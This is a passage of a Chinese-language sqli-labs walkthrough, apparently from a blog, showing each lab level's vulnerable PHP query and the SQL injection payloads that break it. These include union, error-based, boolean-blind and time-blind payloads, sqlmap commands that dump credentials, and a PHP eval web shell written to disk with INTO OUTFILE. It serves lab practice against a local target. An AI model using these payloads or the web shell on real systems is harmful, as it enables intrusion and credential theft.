<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-2/?id=1&quot; --dbs --batch --tables</code></p>
<br>

<br>

<h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>

<p>用<code>&#39;)</code>闭合</p>
<p><code>id=1&#39;) and 1=1 --+</code></p>
<p><code>id=1.999&#39;)  and 1=1 union select 1,2,table_name from information_schema.tables where table_schema=database() limit 1,1 --+</code></p>
<p><code>id=1.999&#39;)  and 1=1 union select 1,2,column_name from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; limit 0,1 --+</code></p>
<p>SQLmap</p>
<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-3/?id=1&quot; --dbs --batch</code></p>
<br>

<h3 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>

<p>用<code>&quot;)</code>闭合</p>
<p>SQLmap</p>
<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-4/?id=1&quot; --dbs --batch</code></p>
<br>

<h3 id="5-报错注入"><a href="#5-报错注入" class="headerlink" title="5.报错注入"></a>5.报错注入</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">	if($<span class="type">row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">  	echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    	echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	print_r(mysql_error());</span><br><span class="line">	echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;;	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;	</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p><code>id=1&#39; --+</code>页面正常 说明用 <code>&#39;</code>闭合</p>
<p><code>id=1&#39;  and 1=1 --+</code> 有回显</p>
<p><code>id=1&#39;  and 1=2 --+</code>无回显</p>
<p>查看代码，发现只要语句执行成功就会返回’You are in ……..’</p>
<p>可以考虑使用报错注入或者布尔盲注</p>
<p>报错注入使用<code>updatexml</code></p>
<p><code>id=1&#39;  and updatexml(1,concat(0x7e,(select concat_ws(&#39;:&#39;,database(),version(),user()))),1)--+</code>==&gt; <code>XPATH syntax error: &#39;~security:5.7.26:root@localhost&#39;</code>得到数据库等信息</p>
<p><code>id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39; ),0x7e),1)--+</code>得到表名==&gt; <code>XPATH syntax error: &#39;~emails,referers,uagents,users~&#39;</code></p>
<p><code>id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),0x7e),1)--+</code>得到字段名==&gt;<code> XPATH syntax error: &#39;~id,username,password~&#39;</code></p>
<p><code>id=1&#39; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)--+</code>查账号密码</p>
<br>

<p>SQLmap</p>
<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&quot;</code>  #判断是否存在注入</p>
<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&quot;  --dbs</code>   #获取数据库信息</p>
<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&quot;  -D security --tables</code> #获取表名</p>
<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&quot;  -D security -T users --columns</code>#获取字段名</p>
<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&quot;  -D security -T users -C username,password --dump</code> #获取账号密码</p>
<br>

<br>

<h3 id="6-报错注入"><a href="#6-报错注入" class="headerlink" title="6.报错注入"></a>6.报错注入</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">	if($<span class="type">row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">  	echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">  	echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font size=&quot;3&quot;  color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	print_r(mysql_error());</span><br><span class="line">	echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;;	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;	</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用<code>&quot;</code>闭合</p>
<p>显错注入</p>
<p><code>id=1&quot; --+</code></p>
<p><code>id=1&quot; and 1=1 --+</code></p>
<p><code>id=1&quot; and 1=2 --+</code></p>
<p><code>id=1&quot; and updatexml(1,(concat(0x7e,(select database()),0x7e)),1) --+</code> 查数据库名 ==&gt;<code>XPATH syntax error: &#39;~security~&#39;</code></p>
<p><code>id=1&quot; and updatexml(1,(concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)),1) --+</code> 查表名</p>
<p><code>id=1&quot; and updatexml(1,(concat(0x7e,(select column_name from information_schema.columns where table_schema=database()  and table_name=&#39;users&#39; limit 0,1),0x7e)),1) --+</code> 查字段</p>
<br>

<h3 id="7-文件写入"><a href="#7-文件写入" class="headerlink" title="7.文件写入"></a>7.文件写入</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=((&#x27;$id&#x27;)) LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">	if($<span class="type">row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	echo <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">  	echo <span class="string">&#x27;You are in.... Use outfile......&#x27;</span>;</span><br><span class="line">  	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">  	echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	echo <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	echo <span class="string">&#x27;You have an error in your SQL syntax&#x27;</span>;</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>print_r(mysql_error());</span><br><span class="line">	echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>根据提示要我们写入文件</p>
<p>写入一句话的条件</p>
<blockquote>
<p>有数据库的写入权限</p>
<p>知道网站的绝对路径</p>
<br>
</blockquote>
<p>在做写入练习时，需要用到<code>into outfile</code> ,但执行后却无法生成写入文件</p>
<p>解决方案</p>
<blockquote>
<p>在MYSQL命令行输入 <code>show variables like &#39;%secure%&#39;;</code>查看<code> secure-file-priv</code>的值</p>
<p>发现<code>secure_file_priv</code>值为<code>NULL</code></p>
<p>在my.ini中修改或添加<code>secure_file_priv=&quot;/&quot;</code>然后报存并重启数据库 </p>
<p>运行<code>http://127.0.0.1/sqli-labs/Less-7/?id=-1%27))%20union%20select%201,2,3%20into%20outfile%20%22D:\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\shell.txt%22%20--+</code>成功生产写入文件</p>
</blockquote>
<br>

<p>根据代码进行闭合<code>id=1&#39;)) --+</code></p>
<p><code>id=1&#39;)) and (select count(*) from mysql.user)&gt;0--+</code> 不报错说明是root权限</p>
<p>通过前面的关卡得到决定路径</p>
<p><code>http://127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,@@basedir,@@datadir --+</code>==&gt;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Your Login name:D:\phpstudy_pro\Extensions\MySQL5.7.26\</span><br><span class="line">Your Password:D:\phpstudy_pro\Extensions\MySQL5.7.26\data\</span><br></pre></td></tr></table></figure>

<br>

<p>?id=-1’)) union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()) into outfile “D:\phpstudy_pro\WWW\sqli-labs\Less-7”–+</p>
<p><code>?id=-1&#39;)) union select 1,2,&#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39; into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\shell.php&quot;--+</code></p>
<p>使用菜刀连接</p>
<br>

<h3 id="8-布尔盲注"><a href="#8-布尔盲注" class="headerlink" title="8.布尔盲注"></a>8.布尔盲注</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">	if($<span class="type">row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">  	echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    	echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>print_r(mysql_error());</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>echo &quot;You have an error in your SQL syntax&quot;;</span><br><span class="line">	echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;;	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;	</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>与第五关相比,把部分代码进行了注释，无法使用报错注入，可以考虑布尔盲注或者时间盲注.</p>
<p><code>?id=1&#39; and 1=1 --+</code> 有回显 ’you are in’</p>
<p><code>?id=1&#39; and 1=2 --+</code>无回显</p>
<p>可以判断是布尔盲注</p>
<ul>
<li>判断Mysql数据库是否是在5.0以上</li>
</ul>
<p><code>?id=1&#39; and mid(version(),1,1)=5 --+</code>有回显  或</p>
<p><code>?id=1&#39; and left(version(),1)=&#39;5&#39; --+</code>有回显</p>
<p><code>?id=1&#39; and left(version(),6)=&#39;5.7.26&#39; --+</code> 有回显判断出数据库版本为<code>5.7.26</code></p>
<ul>
<li>判断当前数据库长度</li>
</ul>
<p><code>?id=1&#39; and length(database())&gt;7 --+</code></p>
<p><code>?id=1&#39; and length(database())=8 --+</code></p>
<ul>
<li>截取数据库第一位ascii并判断值</li>
</ul>
<p><code>?id=1&#39; and (ord(mid(database(),1,1)))&gt;114 --+</code></p>
<p><code>?id=1&#39; and (ord(mid(database(),1,1)))=115 --+</code></p>
<p>或者</p>
<p><code>?id=1&#39; and left(database(),1)&gt;&#39;n&#39; --+</code></p>
<p><code>?id=1&#39; and left(database(),1)=&#39;s&#39; --+</code></p>
<p><code>?id=1&#39; and left(database(),2)=&#39;se&#39; --+</code></p>
<p><code>?id=1&#39; and left(database(),3)=&#39;sec&#39; --+</code></p>
<p>依次得到后面7位 ==&gt;数据库名为security</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span><span class="keyword">sql</span><span class="operator">-</span>labs<span class="operator">/</span>less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (ord(mid(database(),1,1)))=</span></span><br><span class="line"><span class="string">115 --+</span></span><br><span class="line"><span class="string">http://127.0.0.1/sql-labs/less-8/?id=1&#x27;</span> <span class="keyword">and</span> (ord(mid((<span class="keyword">select</span> </span><br><span class="line">database()) ,<span class="number">2</span>,<span class="number">1</span>))) <span class="operator">=</span> <span class="number">101</span> <span class="comment">--+</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span><span class="keyword">sql</span><span class="operator">-</span>labs<span class="operator">/</span>less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (ord(mid((select </span></span><br><span class="line"><span class="string">database()) ,3,1))) = 99 --+</span></span><br><span class="line"><span class="string">http://127.0.0.1/sql-labs/less-8/?id=1&#x27;</span> <span class="keyword">and</span> (ascii(substr((<span class="keyword">select</span> </span><br><span class="line">database()) ,<span class="number">4</span>,<span class="number">1</span>))) <span class="operator">=</span> <span class="number">117</span> <span class="comment">--+</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span><span class="keyword">sql</span><span class="operator">-</span>labs<span class="operator">/</span>less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (ascii(substr((select database()) ,5,1))) = 114 --+</span></span><br><span class="line"><span class="string">http://127.0.0.1/sql-labs/less-8/?id=1&#x27;</span> <span class="keyword">and</span> (ascii(substr((<span class="keyword">select</span> database()) ,<span class="number">6</span>,<span class="number">1</span>))) <span class="operator">=</span> <span class="number">105</span> <span class="comment">--+</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span><span class="keyword">sql</span><span class="operator">-</span>labs<span class="operator">/</span>less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (ascii(substr((select database()) ,7,1))) = 116 --+</span></span><br><span class="line"><span class="string">http://127.0.0.1/sql-labs/less-8/?id=1&#x27;</span> <span class="keyword">and</span> (ascii(substr((<span class="keyword">select</span> database()) ,<span class="number">8</span>,<span class="number">1</span>))) <span class="operator">=</span> <span class="number">121</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<br>

<p>获取数据库第一张表的长度(注:这里length()里面要再加一个括号 )</p>
<p><code>id=1&#39; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;5 --+</code></p>
<p><code>id=1&#39; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6 --+</code></p>
<p>也可以这样写</p>
<p><code>?id=1&#39; and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)&gt;5 --+</code> 最终得到长度为6</p>
<p><code>?id=1&#39; and (select length(table_name) from information_schema.tables where table_schema=database() limit X,1)&gt;5 --+</code> 判断第X张表的长度</p>
<br>

<ul>
<li>判断表的第N个字符 截取第N位的ASCII码进行判断,利用<code>ord()</code> 和 <code>mid(***,1,1)</code>或者<code>substr(***,1,1)</code></li>
</ul>
<p><code>?id=1&#39; and ord(mid((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1))=101  --+</code>判断security库中的第一个表的第一个ascii值为101 即<code>e</code></p>
<p><code>?id=1&#39; and ord(mid((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),2,1))=109  --+</code> 第二位位<code>m</code>    ==&gt;最终得到第一张表名为<code>emails</code></p>
<p>第X张表的第N位ASCII码值判断</p>
<p><code>?id=1&#39; and ord(mid((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit X-1,1),N,1))=101  --+</code></p>
<p>也可以利用<code>regexp</code>注入获取<code>users</code>表中的列</p>
<p><code>http://127.0.0.1/sql/Less-8/?id=1&#39; and 1=(select 1 from information_schema.columns where table_name=&#39;users&#39; and column_name regexp &#39;^us&#39; limit 0,1)--+</code></p>
<br>

<p>使用SQLmap</p>
<p><code>python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-8/?id=1 --dbs --technique B --batch</code></p>
<blockquote>
<p>参数：–technique</p>
<p>这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式。</p>
<p>支持的探测方式如下：</p>
<p>B: Boolean-based blind SQL injection（布尔型注入）<br>E: Error-based SQL injection（报错型注入）<br>U: UNION query SQL injection（可联合查询注入）<br>S: Stacked queries SQL injection（可多语句查询注入）<br>T: Time-based blind SQL injection（基于时间延迟注入）</p>
</blockquote>
<br>

<h3 id="9-时间盲注"><a href="#9-时间盲注" class="headerlink" title="9.时间盲注"></a>9.时间盲注</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">	if($<span class="type">row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">  	echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    	echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>print_r(mysql_error());</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>echo &quot;You have an error in your SQL syntax&quot;;</span><br><span class="line">	echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;;	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;	</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>无论语句是否执行成功，都会返回同样的回显，所以需要通过时间盲注猜解数据</p>
<p><code>?id=1&#39; and sleep(3) --+</code>尝试<code>&#39;```&quot;</code>等闭合方式，根据<code>sleep</code>确认是否闭合</p>
<p><code>?id=1&#39; and if(mid(version(),1,1)=5,sleep(5),1) --+</code>判断数据库版本</p>
<p><code>?id=1&#39; and if(length(database()=8),sleep(5),1) --+</code>判断数据库长度</p>
<p><code>?id=1&#39; and if(ascii(mid(database(),1,1))=115,sleep(5),1) --+</code> 判断数据库名</p>
<p><code>?id=1&#39; and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;3,sleep(5),1) --+</code>判断表长度(length()里面的需要加<code>()</code>)</p>
<p>使用SQLmap</p>
<p><code>python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-9/?id=1 --dbs --technique T --batch</code></p>
<br>

<h3 id="10-时间盲注"><a href="#10-时间盲注" class="headerlink" title="10.时间盲注"></a>10.时间盲注</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$id <span class="operator">=</span> <span class="string">&#x27;&quot;&#x27;</span>.$id.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">	if($<span class="type">row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">  	echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    	echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>print_r(mysql_error());</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>echo &quot;You have an error in your SQL syntax&quot;;</span><br><span class="line">	echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;;	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;	</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>和第九关一样，不过是双引号闭合</p>
<p><code>?id=1&quot; and sleep(5)--+</code></p>
<br>

<h3 id="11-POST注入"><a href="#11-POST注入" class="headerlink" title="11.POST注入"></a>11.POST注入</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"> @$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT username, password FROM users WHERE username=&#x27;$uname&#x27; and password=&#x27;$passwd&#x27; LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);  </span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">if($<span class="type">row</span>)</span><br><span class="line">&#123;</span><br><span class="line"> 		<span class="operator">/</span><span class="operator">/</span>echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot;&gt;&#x27;</span>;	</span><br><span class="line"> 		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">	echo <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;</span>;</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>echo &quot; You Have successfully logged in\n\n &quot; ;</span><br><span class="line"> ......</span><br></pre></td></tr></table></figure>

<p><code>uname=admin&#39; and 1=1  --  &amp; passwd=admin</code>或者<code>uname=admin&#39; and 1=1 #  &amp; passwd=admin</code> <code>--+</code>会报错</p>
<p><code>uname=admin&#39; order by 2  --   &amp; passwd=admin</code>判断字段数</p>
<p><code>uname=-1&#39; and 1=1 union select 1,2 --    &amp; passwd=admin</code> 找回显点</p>
<p><code>uname=-1&#39; and 1=1 union select @@datadir,version() --    &amp; passwd=admin</code>查看数据库版本</p>
<br>

<p>SQLmap</p>
<p><code>python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-11/ --data=&quot;uname=123&amp;passwd=123&amp;submit=Submit&quot; --batch --dbs</code></p>
<h3 id="12-POST注入"><a href="#12-POST注入" class="headerlink" title="12 POST注入"></a>12 POST注入</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">@$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>

<p><code>&quot;) #</code>闭合</p>
<p>SQLmap</p>
<p><code>python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-12/ --data=&quot;uname=123&amp;passwd=123&amp;submit=Submit&quot; --batch --dbs</code></p>
<br>

<h3 id="13-POST型布尔盲注"><a href="#13-POST型布尔盲注" class="headerlink" title="13 POST型布尔盲注"></a>13 POST型布尔盲注</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">@$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT username, password FROM users WHERE username=(&#x27;$uname&#x27;) and password=(&#x27;$passwd&#x27;) LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">	$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">	if($<span class="type">row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  		<span class="operator">/</span><span class="operator">/</span>echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot;&gt;&#x27;</span>;	</span><br><span class="line">  		</span><br><span class="line">  		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;</span>;</span><br><span class="line">		<span class="operator">/</span><span class="operator">/</span>echo &quot; You Have successfully logged in &quot; ;</span><br><span class="line">		echo <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#x27;</span>;	</span><br><span class="line">		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		<span class="operator">/</span><span class="operator">/</span>echo <span class="string">&#x27;Your Login name:&#x27;</span>. $<span class="type">row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="operator">/</span><span class="operator">/</span>echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		<span class="operator">/</span><span class="operator">/</span>echo <span class="string">&#x27;Your Password:&#x27;</span> .$<span class="type">row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">		<span class="operator">/</span><span class="operator">/</span>echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;   /&gt;&#x27;</span>;	</span><br><span class="line">		</span><br><span class="line">  		echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span>  </span><br><span class="line">	&#123;</span><br><span class="line">		echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">		<span class="operator">/</span><span class="operator">/</span>echo &quot;Try again looser&quot;;</span><br><span class="line">		print_r(mysql_error());</span><br><span class="line">		echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">		echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">		echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">		echo <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot;   /&gt;&#x27;</span>;	</span><br><span class="line">		echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>没有回显，使用布尔盲注</p>
